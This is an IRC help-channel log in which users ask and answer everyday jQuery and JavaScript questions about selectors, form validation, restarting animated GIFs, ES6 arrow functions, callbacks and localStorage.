[00:00:02] <Cork> it isn't done for normal form submission either
[00:00:18] <Cork> normally it is solved by adding a hidden input field before the checkbox
[00:01:16] <Cork> <input type="hidden" name="option" value="0"><input type="checkbox" id="option" name="option" value="1"><label for="option">Option</label>
[00:03:24] <DRWhite> excellent, thanks.
[00:03:42] <DRWhite> for serialize.. perfect thanks
[00:20:25] <markamodo> cork, I'm having trouble understanding what the source code does. I need to go home now but I'll return to this chat once I get there. Thank you for your help so far.
[00:20:48] <Cork> markamodo: np
[00:23:01] <Ububegin> http://jsfiddle.net/Ss9Bc/ ... this code perfroms validation.. but how do i prevent it from processing further onwards, if an cell is invalid
[00:24:01] <Cork> Ububegin: check the documentation for the plugin
[00:25:12] <Cork> Ububegin: you need to find a way that the plugin exposes the validation information
[00:27:43] <Ububegin> Cork: http://jsfiddle.net/9yetQ/ .. hmmm, :|
[00:45:56] <anli_> The function I declare using $.validator.addMethod is never called, is that because of the first string passed?
[00:54:54] <rabbi1> what is the difference between :first and nth-child(1) …. ?
[00:55:02] <rabbi1> are both different ?
[00:58:42] <Cork> they are the same
[00:58:52] <Cork> oh wait no
[00:58:58] <Cork> :first-child is the same
[00:59:05] <Cork> :first is the same as $().first()
[00:59:24] <Cork> meaning it returns the first matched element, not depending on if they are in the same element or not
[00:59:35] <rabbi1> Cork: i am getting a different output when i console it……
[00:59:55] <Cork> rabbi1: what do you mean?
[01:02:33] <rabbi1> i am trying to "var el = $('ul').find('li:first);"  and then "var elStyle = el[0].style;"
[01:02:54] <Cork> $('ul li').first()
[01:02:56] <rabbi1> var el = $('ul').find('li:nth-child[1]);"  and then "var elStyle = el[0].style;" this gives error
[01:03:04] <Cork> ya it isn't []
[01:03:22] <Cork> $('ul').find('li:nth-child(1)'); should work
[01:03:37] <Cork> but like i said :first and :nth-child isn't the same thing
[01:05:18] <rabbi1> Cork: are there any replacement for :first and :last ?
[01:05:35] <Cork> .first()
[01:05:37] <Cork> .last()
[01:05:41] <rabbi1> where i can get more number of elements rather than only :first and :last
[01:05:49] <Cork> so like i said $('ul li').first()
[01:06:05] <Cork> then skip the .first/.last all together
[01:06:13] <Cork> $('ul li')
[01:06:23] <rabbi1> first and last is good when i have only two (li) but in this case i have 3 (li) how can i track the 2nd element ?
[01:06:27] <Cork> if you want a specific range use splice
[01:06:36] <Cork> ?api splice
[01:06:36] <b-ot> Cork: No matches.
[01:06:42] <Cork> ?api slice
[01:06:42] <b-ot> Cork: .slice(): Reduce the set of matched elements to a subset specified by a range of indices. http://api.jquery.com/slice/
[01:06:45] <Cork> opps :x
[01:06:49] <Cork> slice not splice
[01:08:14] <dieguezz> hi, does anyone know why slideshow images are getting fuzzy until i place mouse over? http://goo.gl/1cybbY
[01:08:21] <shoky> also .eq() or :eq() for getting just one specific index
[01:09:52] <rabbi1> Cork: PERFECT
[01:09:58] <rabbi1> thanks
[01:11:04] <Cork> dieguezz: the img tag is most likely not exactly the same size as the source image
[01:11:30] <dieguezz> ty Cork ill check it
[01:11:47] <rabbi1> shoky: yeah, even that great… if i am looping which is better ?
[01:12:26] <shoky> rabbi1: depends what you're doing in the loop and what you wanna get..
[01:13:02] <rabbi1> trying to add styles for each of the li
[01:13:44] <shoky> donno why you need .eq() or .first() or .slice() then
[01:13:47] <dieguezz> [Cork] that was it! it was 2px wrong. Tyvm!! :)
[01:14:10] <Cork> :)
[01:15:04] <Cork> rabbi1: if you want to set the style on all of them you don't even need to loop
[01:15:06] <rabbi1> shoky: that's for different purpose.. that's done
[01:15:19] <Cork> just do $('ul li').css({ /* new-style */ })
[01:15:36] <shoky> rabbi1: as usual, make a fiddle if you want the best answer for your usecase
[01:15:39] <rabbi1> Cork: the styles for each are different
[01:15:50] <Cork> then $().each(function() {})
[01:16:20] <__equinox> how do I access entity manager from a form type class?
[01:16:27] <rabbi1> Cork: yeap, thinking of storing different styles in array or object and then pass it one by one
[01:16:32] <__equinox> i want to create a dynamic choice
[01:16:35] <__equinox> in my form
[01:17:34] <Cork> __equinox: "entry manager"?
[01:17:37] <shoky> tf is entity manager
[01:17:44] <__equinox> entity manager
[01:17:44] <__equinox> sorry
[01:17:58] <Cork> do wtf is "entry manager"?
[01:18:01] <Cork> *so
[01:18:07] <shoky> lol
[01:18:21] <Cork> ... *entity
[01:18:22] <Cork> >_<'
[01:18:31] <__equinox> sorry typo there guys
[01:18:47] <Cork> __equinox: well the second versions doesn't mean much more to us
[01:19:07] <ph88> does someone know if there is a library that can visualize triggers and listeners ?
[01:19:07] <__equinox> Cork: you guys don't know what an entity manager is?
[01:19:10] <shoky> except that you're probably talking about some library/framework you're using that we're unaware of
[01:19:43] <Cork> __equinox: not without context no, is it a plugin your using or something?
[01:19:57] <ph88> i don't mean as they are fired ... just to see how they are hooked up ... maybe output as a graph (vertices & edges)
[01:19:58] <shoky> __equinox: javascript and jquery don't have an entity manager. you using breeze.js or something?
[01:20:31] <dieguezz> [Cork] it wasnt solved... i thought so but its not. The problem comes when title captions pass over the img
[01:23:32] <ph88> __equinox: are you talking about serverside js ?
[01:25:02] <dieguezz> i just found out it only happens in chrome Cork
[01:25:36] <Cork> diegok: different browser uses different resize algorithm
[01:25:40] <Cork> *dieguezz:
[01:25:53] <Cork> you should prob see the same in ie as they use the same as chrome
[01:29:15] <anli_> How do I trig the validation using jquery validate? I have tried $('form').validate(), $(':hidden').change(); and $(':hidden').blur();
[01:30:58] <anli_> Now I also tried $.validator.validate();
[01:31:10] <Cork> $('form').valid()
[01:31:24] <anli_> Oh, I thought that just returned a boolean
[01:31:31] <Cork> well sure
[01:31:43] <Cork> but it has to run the checks to do so
[01:31:46] <anli_> I want those validation messages to update
[01:31:50] <anli_> yeah
[01:31:52] <anli_> trying
[01:32:10] <anli_> Nice! :)
[01:32:12] <anli_> Thanks
[01:34:30] <Ububegin> how do i display text in a div tag ? shloudl i use text() method
[01:34:45] <shoky> Ububegin: sure
[01:58:22] <Syrit> guys, is $.ajax().done() , equilivant to ajax:onsuccess ?
[02:04:51] <shoky> Syrit: probably. what's ajax:onsuccess ?
[02:08:28] <Syrit> shoky i meant on success,
[02:08:57] <shoky> Syrit: yes .done() is equivalent to the success callback
[02:09:21] <shoky> it allows for more flexibility
[02:09:29] <Syrit> thanks
[02:49:07] <hxm> hi, I have a form when I type in the text box it is already working, but if I press <return> by mistake I get page refreshed
[02:49:14] <hxm> how to avoid this?
[02:50:09] <Clorith> hxm: you can hook into keydown/keyup and see if it's the return key and halt it
[02:52:23] <Cork> or check focused element in the submit event
[02:52:41] <Cork> hmm wait no that won't work for mac
[03:08:36] <adammcarth> Hey guys. How do you loop through json that's nested under something? I've got an example gist here if you want to check it out: https://gist.github.com/adammcarthur/7022335
[03:09:18] <Cork> adammcarth: $.each can loop objects
[03:09:34] <Cork> $.each(obj, function(key, value) {})
[03:09:51] <shoky> (and data.errors accesses that errors object)
[03:11:18] <adammcarth> Cork: shoky: Ahhhh.
[03:14:05] <adammcarth> Cork: shoky: Like this yeah? https://gist.github.com/adammcarthur/7022335
[03:14:23] <Cork> ya
[03:15:10] <adammcarth> Man, I'm falling for jQuery
[03:15:16] <_rgn> adammcarth: you might like console.log more than alert
[03:15:58] <adammcarth> _rgn: Does that output in the chrome developer console?
[03:16:15] <_rgn> yes
[03:16:20] <adammcarth> nice. thanks
[03:16:41] <adammcarth> Cheers Cork and shoky as well
[03:22:42] <eeezkil1> can you trigger jplot ( http://www.jqplot.com/tests/bar-charts.php ) highlight( http://www.jqplot.com/docs/files/plugins/jqplot-highlighter-js.html ) from the outside
[03:23:26] <Cork> outside?
[03:23:59] <eeezkil1> e.g. not when the `jqplotDataClick` event is fired
[03:24:15] <eeezkil1> for example from hovering over something else
[03:24:24] <eeezkil1> not related with the chart
[03:27:27] <grafi> oO
[03:30:23] <Nephro> How do I handle session when using ajax requests?
[03:32:15] <Cork> Nephro: it works by it self
[03:32:24] <Cork> Nephro: the session cookie is sent just like normal
[03:32:33] <Nephro> Cork, it seems that it is not
[03:32:46] <Cork> are you calling a different domain?
[03:33:27] <Nephro> Cork, no, "$.ajax({ url: "/x/info/" + id,"
[03:33:40] <Cork> then it should just work
[03:33:55] <Cork> unless you have some special code that resets the cookie
[03:35:34] <adammcarth> Lol @ how neither javascript or jQuery has a capitalize function
[03:36:32] <Nephro> oh lol, I'm so dumb... I started working today with an open browser window and was making requests by pressing buttons. I was basically logged out on an open page
[03:36:47] <Nephro> Guess I need to press f5 more often, even when implementing ajax handlers
[03:39:42] <adammcarth> Cork: Is there something similar to ruby in javascript where you can use a variable within string quotes, eg -  ` var message = "hello world"   $("Message: #{test}")
[03:39:59] <Cork> no
[03:40:12] <Cork> you would have to grab a template engine if you want that
[03:40:22] <adammcarth> Cork: so using + signs is the only way around?
[03:40:40] <Cork> yes
[03:40:44] <_rgn> coffeescript has string interpolation if you want to check it out at some point
[03:40:45] <Cork> jqote, underscore, mustache <-- example engines
[03:41:29] <adammcarth> -rgn: Is coffeescript really that useful? I'm thinking about using it, but I want to learn proper jQuery/javascript first
[03:42:07] <_rgn> i don't think it's a question of utility, more about preference
[03:42:12] <Cork> adammcarth: i would say no, it is a way to compile one language into another
[03:42:48] <adammcarth> Cork: Yeah, it's like a Sass/less for js right?
[03:43:15] <Cork> and the big downside to coffiescript is that you need a js endine on the server to handle it (unless you want to manually convert it to js before publishing)
[03:43:38] <Cork> adammcarth: more or less, but with less possitive effects
[03:43:51] <Cork> css has no automation solutions built in
[03:43:53] <Cork> js does
[03:44:19] <Cork> so coffiescript just offers different dialect for js
[03:44:25] <Cork> that you then convert to js
[03:44:48] <Cork> while sass/less provides automation that is hard to handle in css
[03:44:52] <adammcarth> Yeah, not a fan of that
[03:45:09] <Cork> like property prefixes for example
[03:46:20] <Cork> (and the fact that coffiescript adds the stupid idea of implicit returns to functions doesn't help me liking it)
[03:47:45] <Cork> i for a long time hated es6 for the same reason, until i found out they arn't doing that; they use a very limited case for it
[03:47:56] <_rgn> it comes down to preference, if you like the language then the compilation etc. are trivialies
[03:48:08] <adammcarth> mmm
[03:48:27] <Cork> _rgn: implicit returns is never good to have for generic functions
[03:48:35] <Cork> it is very easy to get unexpected results
[03:49:09] <grafi> what would be returned oô
[03:49:09] <Cork> $(':checkbox').each(function() { this.<property = false; });
[03:49:19] <Cork> *hmm why is only the first element set to false*
[03:49:26] <Cork> oh right implicit
[03:49:30] <Cork> $(':checkbox').each(function() { this.<property = false; return; });
[03:49:36] <grafi> brrr
[03:49:37] <grafi> :P
[03:50:02] <Cork> he got a big number of bugs like that in rails models
[03:50:15] <Cork> so now we have checkin rules that they always has to end with return
[03:50:23] <Cork> *SIIILY*
[03:50:46] <grafi> return;
[03:50:54] <Cork> rails don't use ; :)
[03:51:04] <Cork> as in for ruby not js ^^'
[03:51:36] <Cork> opps he==we
[03:51:55] <Cork> though i love es6 syntax...
[03:52:16] <Cork> if you show that to someone they just confusely stare at you :)
[03:52:36] <Cork> var x = (y) => y*y; x(2)
[03:52:40] <Cork> XD
[03:52:50] <Cork> (that is valid es6)
[03:53:33] <grafi> yeah, now you confused me
[03:53:34] <grafi> :P
[03:53:48] <grafi> () bring back nightmares of scheme :D
[03:54:00] <Cork> var x = (y) => y*y; x(2) is the same as var x = function(y) { return y * y; }; x(2)
[03:54:22] <Cork> except it doesn't create a scope
[03:54:51] <Cork> (so no this variable)
[03:55:20] <grafi> hm
[03:55:28] <grafi> im not convinced i would use that
[03:55:29] <grafi> ^^
[03:55:41] <Cork> well not in that cause but think of something like
[03:56:01] <Cork> setTimeout(() => this.checked = true, 100);
[03:56:32] <Cork> hmm i think you need a ; there
[03:56:35] <Cork> setTimeout(() => this.checked = true;, 100);
[03:56:41] <grafi> wuah
[03:56:46] <grafi> that looks horrible :P
[03:56:57] <grafi> ;,
[03:57:05] <Cork> and that would be for .on('clicked', function() { setTimeout(() => this.checked = true;, 100); })
[03:57:11] <grafi> evil grin blink smiley
[03:57:12] <grafi> :P
[03:57:13] <Cork> this would refer to the clicked element
[03:57:26] <hxm> hi I have a script with keydown() and it detects the keyCode 13, it works and the form is sent, but the page is refreshed, I used event.preventDefault() and return false; but still, what can i do?
[03:57:29] <Cork> *click
[03:58:05] <Cork> hxm: wait, do you want to send the form on enter or not?
[03:58:15] <hxm> Cork: that is
[03:58:27] <Cork> is?
[03:58:58] <Cork> if you want enter to cause the form to send it should just work by default
[03:59:12] <Cork> just make sure to have a form around it and listen for submit on it
[04:00:37] <Cork> grafi: that said, there is a second version of it that doesn't have implicit return () => {}
[04:00:42] <xdjuj__> Hi
[04:00:50] <xdjuj__> I've a quetsion about animated GIF
[04:00:55] <Cork> it basically works like a normal function (no this there either though)
[04:00:57] <hxm> ah, the fact is I don't have submit button
[04:01:08] <xdjuj__> I'de like to relaunch a GIF with jQuery
[04:01:08] <grafi> es6 will be very intersting :P
[04:01:15] <Cork> xdjuj_: you can't
[04:01:20] <grafi> relaunch?
[04:01:21] <Cork> grafi: sure is
[04:01:21] <grafi> oô
[04:01:22] <xdjuj__> Ouch...
[04:01:33] <grafi> what does that even mean
[04:01:43] <Cork> xdjuj_: only way to restart the animation is to grab a new image from the server
[04:01:47] <xdjuj__> Cork is there no way like for example delete and regenerate the image ?
[04:01:57] <xdjuj__> Ok so using ajax ?
[04:01:59] <Cork> img.src = img.src + '1';
[04:02:03] <Cork> can't use ajax
[04:02:10] <grafi> imgur has some funtionality like that, only having one gif play at a time
[04:02:22] <grafi> not sure how they do it though :P
[04:02:31] <Cork> canvas most likely
[04:02:50] <xdjuj__> Cork I'm not sure to understand :(
[04:03:00] <xdjuj__> Have you a link or an idea ? :)
[04:03:11] <Cork> xdjuj_: if you change the url of the image so it doesn't match the cache
[04:03:17] <Cork> a new image is fetched from the server
[04:03:31] <Cork> http://www.example.com/image.gif?_=1
[04:03:32] <Cork> http://www.example.com/image.gif?_=2
[04:03:32] <Cork> http://www.example.com/image.gif?_=3
[04:03:42] <Cork> when the new image is pulled, the animation restarts
[04:03:56] <Cork> it is a sad hack, but... it is the only way to do it
[04:04:46] <Cork> alternatively you can use a big splice image and then do the animation from js or css3
[04:04:54] <Cork> that way you COULD restart it
[04:05:01] <Cork> though the image would be bigger
[04:05:30] <Feel> Hello. Give me link please, on good tutorial how to do jquery dropdown?
[04:05:41] <Cork> and also gif animation is MUCH lighter on the system then css3 or js
[04:05:56] <Cork> ?g jquery dropdown plugin
[04:05:56] <b-ot> Cork: dropdown | jQuery Plugin Registry → http://plugins.jquery.com/tag/dropdown/
[04:05:59] <xdjuj__> Cork I would love to do some canvas or things like that, but my only tools at this time, is Photoshop :p
[04:06:22] <Cork> xdjuj_: and the canvas part is hard
[04:06:26] <xdjuj__> And I know how to do animated GIF, but don't know how to do other things
[04:06:40] <Syrit> i can't seem to append a checkbox to a div, with a text/label for it ! , should append a lable for ? or is it a checkbox attr ?
[04:06:48] <Cork> xdjuj_: what are you trying to do?
[04:06:51] <xdjuj__> Exactly :)
[04:06:56] <Cork> you might be able to do without the gif
[04:07:12] <xdjuj__> Many tricky animations -> so easy in animated GIF, hard in jQuery
[04:07:15] <Cork> Syrit: yes it should work just fine
[04:07:34] <xdjuj__> Like mini movies
[04:07:44] <Syrit> with attr? or with a sperataed lable Cork ?
[04:07:48] <Cork> xdjuj_: if it is just moving sections css3 and separate dom elements could do it
[04:07:58] <Cork> Syrit: label isn't an attribute
[04:08:03] <Cork> it is an element
[04:08:10] <xdjuj__> Cork no it's not
[04:08:25] <xdjuj__> I'm already using TweenLite and CSS3 as well
[04:08:34] <Syrit> yes yes, i meant, should i append a label for the cehckbox? or is it a text attr for the checkbox itself ?
[04:08:49] <xdjuj__> But I've many complex animations (like we could do with flash)
[04:08:54] <Cork> Syrit: what do you normally add when you do it in plain html? :)
[04:09:06] <Syrit> i dont know
[04:09:14] <Cork> but joke a side, yes a checkbox can't hold any text
[04:09:23] <Cork> except for the value it sends to the server when it is checked
[04:10:04] <Cork> <label><input type="checkbox">text</label> or <input type="checkbox" id="a"><label for="a">text</label>
[04:10:56] <Syrit> i see, thanks Cork
[04:11:09] <Syrit> is it the same ? <input type="checkbox" id="someID">Hello World</input> ?
[04:11:33] <Cork> no
[04:11:42] <Cork> input is a self closing element
[04:11:45] <Cork> it can't have an end tag
[04:12:37] <Syrit> oh, i see
[04:12:39] <Syrit> thanks
[04:15:34] <xdjuj__> Thank you SO MUCH Cork :) That's really fine. That work exactly like I need to :)
[04:16:20] <Cork> wasting some bandwidth, but as long as the image isn't too large it shouldn't matter
[04:17:28] <xdjuj__> Yes, sure :) But right now, I just NEED to have something working :p I will try later to optimise :p
[04:17:59] <eeezkil1> using jplot ( http://www.jqplot.com/tests/bar-charts.php ) is it possible to highlight the bars when hovering over the legend
[04:18:08] <Cork> i've used that cache trick my self for gif animations
[04:18:13] <Cork> those images was very small though
[04:19:24] <xdjuj__> But this time, my page has a 16 000 px height...
[04:19:35] <Cork> O_o
[04:19:49] <xdjuj__> And we have about… 20 or 30 animations I guess on this page
[04:19:56] <Cork> ugg
[04:19:56] <xdjuj__> So it would be a HUGE load :p
[04:20:12] <Cork> ya, sounds horrible
[04:20:32] <Cork> just from the basepoint of how much you have going on there
[04:21:17] <xdjuj__> Done !
[04:21:23] <xdjuj__> function utime(){ return Math.round((new Date()).getTime() / 1000); }
[04:21:31] <xdjuj__> .gif?_='+utime()+'"/>
[04:21:36] <xdjuj__> does the trick
[04:21:45] <Cork> ya, sounds about right
[04:22:04] <xdjuj__> And I didn't tell you yet :p
[04:22:06] <Cork> might just have got for the unix time value though
[04:22:36] <xdjuj__> but, this page is about 15/16 000 px height… AND, have about 5 soungs playing at different point :p
[04:22:50] <xdjuj__> It's definitively a dirty page :)
[04:23:01] <Cork> xdjuj_: please share the link when your done so i can block it in my firewall...
[04:23:04] <Cork> j/k
[04:23:05] <mrchris> Hi All.  if I have an object X which represents a previously selected set of elements, then how would I select all the 'sub' h1 objects within it?
[04:23:10] <xdjuj__> lol :)
[04:23:35] <Syrit> Cork, this works, but the lable is like bold, different from other existing checkboxes, what can i do about it ? checkboxes.append('<input id="contact_ids_" name="contact_ids[]" type="checkbox"'+'value='+ data._id + '>');
[04:23:35] <Syrit>           checkboxes.append('<label for="contact_ids_">'+ name + '</label>');
[04:23:42] <xdjuj__> And this page would be include as a part of an existant view of a website… Huge trick :p
[04:24:05] <Cork> ?api filter @ mrchris
[04:24:05] <b-ot> mrchris: .filter(): Reduce the set of matched elements to those that match the selector or pass the function's test.  http://api.jquery.com/filter/
[04:24:30] <mrchris> b-ot: thank!
[04:24:31] <mrchris> s
[04:24:32] <eeezkil1> Using jplot ( http://www.jqplot.com/tests/bar-charts.php ).. Is it possible to highlight the bars when hovering over the legend?
[04:24:32] <Cork> Syrit: check how the other checkboxes is added and add them the same way
[04:24:36] <Cork> heh
[04:24:44] <Cork> mrchris: that is just a bot ^^'
[04:25:05] <bobdobbs> regarding this snippet: http://hastebin.com/sacucaxale.coffee
[04:25:19] <Cork> eeezkil1: check the documentation or possibly the code, that is what we would have to do to answer
[04:25:21] <bobdobbs> are the two inner functins callbacks?
[04:25:24] <Syrit> the other checkboxes are added as static html, not as dynamic ones with jQ, when inspect they have no label, they only  have text
[04:25:48] <eeezkil1> Cork: I did just that.. and couldn't find it.. that's why I'm asking
[04:25:52] <Cork> ?api hover @ bobdobbs
[04:25:52] <b-ot> bobdobbs: .hover(): Bind two handlers to the matched elements, to be executed when the mouse pointer enters and leaves the elements. http://api.jquery.com/hover/
[04:26:08] <bobdobbs> Hey Cork
[04:26:16] <Cork> o/
[04:26:20] <bobdobbs> \o
[04:26:47] <bobdobbs> What I'm trying to do is figure out what 'callbacks' in js and jquery are. After reading a couple of descriptions, I'm looking at the aip
[04:26:50] <bobdobbs> *api
[04:26:55] <Cork> Syrit: yes, but the dom order is what matters
[04:27:17] <Syrit> i don't get what you mean Cork
[04:27:36] <bobdobbs> Cork: so, looking at that code snippet (copied from the api), I'm wondering: are the two inner functions things called 'callbacks'?
[04:27:50] <Cork> bobdobbs: a callback is a variable pointing to a function that that you want to have executed when the function you call do something or get to a specific point
[04:28:09] <bobdobbs> oh
[04:28:16] <Cork> bobdobbs: no they are called inline functions, any function you send to .hover() is callbacks
[04:28:23] <bobdobbs> so a callback is a variable? Not a function?
[04:28:37] <Cork> bobdobbs: a callback is a reference to a function
[04:28:43] <bobdobbs> I see
[04:28:57] <Cork> function myCallback() {} .hover(myCallback); is also a callback
[04:29:20] <bobdobbs> Ah.
[04:29:28] <Cork> callback means just that "the function calls you back"
[04:29:34] <bobdobbs> So in that paste there are no callbacks. Just inner functions
[04:29:45] <bobdobbs> Is that correct?
[04:30:05] <Cork> no there are two inline functions (or also known as anonymous functions) that is used as callbacks for that call
[04:30:27] <Cork> the callback isn't the function it is that it is used by the function you give it to
[04:31:00] * bobdobbs scratches head
[04:31:24] <Cork> bobdobbs: function(callback) {}  a(function() {}); <-- isn't a callback
[04:31:34] <Cork> bobdobbs: function(callback) { callback(data); }  a(function() {}); <-- is a callback
[04:31:49] <bobdobbs> ah, ok
[04:32:18] <bobdobbs> so, a callback isn't a function. It's a variable passed into a function, where the variable points to a function.
[04:32:22] <bobdobbs> is that right?
[04:32:32] <Cork> yes and no, the callback is what the function does
[04:32:39] <Cork> it is calling callbacks
[04:32:56] <Cork> functions is just functions
[04:33:30] <Cork> bobdobbs: but yes to send a function as a callback it needs to be referenced by a variable
[04:33:31] <bobdobbs> this confuses me, because I keeping seeing the term 'callback functions' used in terms of javascript
[04:34:00] <sacho> bobdobbs, people are imprecise with their terminology.
[04:34:07] <Cork> ya
[04:34:07] <bobdobbs> ok
[04:34:31] <Cork> it basically means a function used for callback
[04:34:48] <Cork> shortened to callback function
[04:34:52] <bobdobbs> lolz. the most frustrating thing in the world for a programmer: another programmer who uses imprecise language.
[04:35:09] <Cork> bobdobbs: just wanted to be very clear so you didn't mistake syntax for callback :)
[04:35:15] <bobdobbs> kewl
[04:35:52] <sacho> cork's explanation makes sense in light of people mistaking "callback" for "a special type of function" (as if you have to declare the function as a callback), or javascript objects as json, and such.
[04:36:04] <bobdobbs> oh damn
[04:36:20] <bobdobbs> up until now, that was my understanding of callback
[04:36:21] <Cork> a good example of that mistake is .hover(function() { my_function(); })
[04:36:30] <bobdobbs> "a special type of function"
[04:36:33] <Cork> and that is just silly when you can just do .hover(my_function)
[04:37:02] <bobdobbs> I've been readint this page, which says "A callback function, also known as a higher-order function, is a function that is passed to another function"
[04:37:53] <sacho> bobdobbs, that's wrong :)
[04:37:57] <bobdobbs> ok
[04:38:02] <sacho> the higher order function is the one that takes a function as an input
[04:38:12] <bobdobbs> oh
[04:38:29] <bobdobbs> Is there an authoritive definition somewhere?
[04:38:32] <koneko> but a callback function is usually passed to another function
[04:38:40] <sacho> the term comes from mathematics
[04:38:45] <koneko> so that part is true
[04:39:13] <Cork> koneko: i would say it is very rarely not passed to another function
[04:39:30] <Cork> only other situation would be a global variable for the callback
[04:39:46] <Cork> koneko: well the problem is with what callback is
[04:39:53] <sacho> mm, jsonp
[04:39:59] <Cork> heh
[04:40:15] <bobdobbs> like, there's a bunch of articles on the net. They all say slightly different things. And I'm hearing different things again here...
[04:40:36] <bobdobbs> will I have to read an ecmascript doc to find an authoritive definition?
[04:40:47] <Cork> bobdobbs: mdn, and operas page is two good places to start
[04:40:50] <sacho> not really
[04:41:07] <Cork> if you want to dive deep you can read ecmascripts definitions
[04:41:12] <Cork> though that ones is hard
[04:41:23] <koneko> I would suggest just checking out a lot of examples and you should get the idea, ecmascript docs are complicated
[04:41:32] <bobdobbs> ok
[04:42:05] <Cork> ecmascript documentation is basically for implementors, not users
[04:42:15] <bobdobbs> right
[04:42:21] <Cork> so it is lot of low level specs there
[04:42:47] <bobdobbs> Is this an accurate description?: https://github.com/maxogden/art-of-node#callbacks
[04:43:04] <Cork> though that said, it is interesting read as long as you are prepared to do the let work to look up what they talk about :)
[04:43:11] <bobdobbs> oh, actually that isn't a description at all
[04:43:23] <bobdobbs> It's about what callbacks do. Not what they are.
[04:43:31] <Cork> eh.. no
[04:43:45] <Cork> callbacks doesn't need to be asynchronous
[04:43:46] <sacho> a function that is passed to another one with intend to be called by it is good enough
[04:43:56] <Cork> how they are called defines if they are
[04:43:58] <bobdobbs> sacho: ok
[04:44:04] <Cork> ya
[04:44:13] <sacho> the name is actually very descriptive. :)
[04:44:19] <bobdobbs> ah
[04:44:46] <bobdobbs> is it one of those things that is actually so simple that I'm actually thinking too hard about it?
[04:44:55] <Cork> yes
[04:45:00] <bobdobbs> ok
[04:46:06] <bobdobbs> oh yeah. found this while I was googling. Looks interesing: http://callbackhell.com/
[04:46:15] <Cork> bobdobbs: this might be interesting   function calc(func, value) { func(value); } calc(Math.floor, 10.554);
[04:46:36] <Cork> that is another example of a callback, even though it is a callback for a native function
[04:46:43] <bobdobbs> hmmmm
[04:46:58] <bobdobbs> you guys rock
[04:47:09] <bobdobbs> but my brain is giving up
[04:47:11] <Cork> it is basically so you can define if it should do floor, roof, round
[04:47:12] <bobdobbs> thanks for the help
[04:47:27] <Cork> just as a fairly simple example
[04:47:36] <bobdobbs> I'm gonna crash now. Your assistance is much appreciated
[04:47:43] <bobdobbs> I think I'm getting a grasp on it now
[04:47:43] <Cork> :)
[04:47:46] <Cork> good luck
[04:47:53] <bobdobbs> thanks. :)
[04:47:54] <mrchris> Hi.  Could someone help me with this fiddle?  http://jsfiddle.net/Re5eT/1/  The explanation is in the code. thanks.
[04:47:55] <bobdobbs> Night all
[04:49:26] <Cork> mrchris: drop_downs isn't a function
[04:49:39] <Cork> and size isn't how you check the size
[04:49:45] <Cork> just do drop_downs.length
[04:49:54] <shesek> mrbubbles, $(drop_down).filter("option") filters the set of current elements (the <select> box) and looks for <option> elements
[04:50:06] <shesek> what you actually want to do is look for <select>child elements
[04:50:06] <Cork> or drop_downs.each(function() {}) if you need to loop it
[04:50:26] <shesek> * what you actually want to do is look for <select>'s child elements that are <option>s, which you can do with `$(drop_down).find('option')`
[04:50:29] <mrchris> Cork:  drop_downs is my variable.
[04:50:50] <Cork> mrchris: opps sorry read line 13 wrong
[04:50:59] <Cork> mrchris: but ya .size() should be .length
[04:51:20] <shesek> Cork, .size() works too, http://api.jquery.com/size/
[04:51:27] <shesek> tho .length is probably faster
[04:51:42] <Cork> "The .size() method is deprecated as of jQuery 1.8. Use the .length property instead."
[04:51:49] <foobar321> Hi. Im using multi-page template for jquerymobile. Is there any event for $('FIRST-TIME-USER-ENTERS-ANY-PAGE').pageinit ?
[04:51:53] <Cork> and size just returns this.length
[04:52:04] <mrchris> that's just debug code in my example.
[04:52:22] <shesek> mrchris, change filter() to find(), and drop_down should be drop_downs
[04:52:29] <shesek> works for me with those changes
[04:52:32] <Cork> mrchris: drop_downs.children().each()
[04:52:45] <mrchris> shesek: thanks! works a treat
[04:52:47] <Cork> should give you a loop over all the options
[04:52:54] <balance> hi
[04:53:08] <shesek> Cork, the <option>s aren't necessarily the direct children of the <select>
[04:53:16] <Cork> true
[04:53:25] <Cork> you can use option groups
[04:53:26] <shesek> they might be nested under <optgroup>
[04:53:39] <Cork> but most don't
[04:54:03] <balance> want to create an js only tool, nothing big. It's something liek a timetable/task overview. So I need somethign liek a Database, but only very simple one. I only have very few data. I thought about just saving json files. should be okay, shouldnt it? It's really nota lot of data.
[04:54:45] <balance> But idk if it's even possible or if i get restriced
[04:59:20] <balance> Is it bad to save something like csv or json into a local storage?
[04:59:39] <slax0r> depends on what you mean local storage
[05:00:01] <Cork> balance: depends on the size
[05:00:15] <balance> html5 localStorage like localStorage.setItem("bar", foo);
[05:00:21] <Cork> balance: localstorage has some loading time overhead you might want to be careful about
[05:00:40] <balance> I want to easily change the data in a js only app, the data isn't from me. is isn't a lot of data.
[05:01:03] <Cork> balance: just be careful of the data cap
[05:01:07] <Cork> then ya it should be fine
[05:01:27] <Cork> just remember that localstorage is sync, so the page has to freeze while loading until the data is pulled from disk
[05:01:32] <Cork> and this happens on every page load
[05:01:37] <Cork> (from that domain)
[05:01:37] <balance> Doesn't matter, it's a very easy app. At university/school we get exactly task for the next 20 weeks in every course and I want to make an overview. So it isn't a lot of data. So loading time doesn't matter
[05:01:48] <balance> It's offline
[05:02:05] <Cork> well you still get delays from the devies storage device
[05:02:19] <balance> Should be one static page with a table and some data loaded in and some feature to make notes.
[05:02:47] <Cork> balance: the size of the page doesn't matter
[05:02:53] <balance> And maybe change state of one entry to "done" or something.
[05:02:54] <Cork> the size of the data in localstorage does
[05:03:03] <balance> cork I said that to show that I don't have page load
[05:03:04] <balance> s
[05:03:15] <Cork> balance: you always have page load
[05:03:31] <Cork> the size and from where differ though
[05:03:44] <balance> Cork no. And it shouldn't matter if a user refreshes.
[05:04:16] <Cork> balance: if you load from a local file you have a page load from the time it takes the browser to fetch the file from disk; parse it; and render it
[05:04:21] <Cork> so YES you always have page load
[05:04:32] <Cork> you might not have net load though, but that is totally different
[05:05:20] <Cork> without page load you wouldn't have any content
[05:05:53] <balance> cork cna't I just somehow load a json file from the computer if it's an offline file?
[05:06:03] <Cork> balance: yes you can
[05:06:16] <Cork> you can store the json in the offline cache
[05:06:50] <balance> Cork thats not good. Meant having it in the dir of the app.
[05:07:09] <VectorX> hi, can someone tell me how to write this properly,  jQuery(this).children('input:first').attr('checked','checked');
[05:07:10] <Cork> balance: if you are allowed to access the disk then yes
[05:07:20] <balance> Anyway, I'll probably just upload it and fetch it from the internet. It should be easily replaceable.
[05:07:23] <Cork> balance: but then you have to be provided an api to do so
[05:07:51] <Cork> VectorX: what is this?
[05:08:15] <balance> Cork yes. I think the easiest is to just get it from an online source. or even do a proper web app with a php backend.
[05:08:24] <Cork> do you just want direct children of this or anyone below it? (grandchildren)
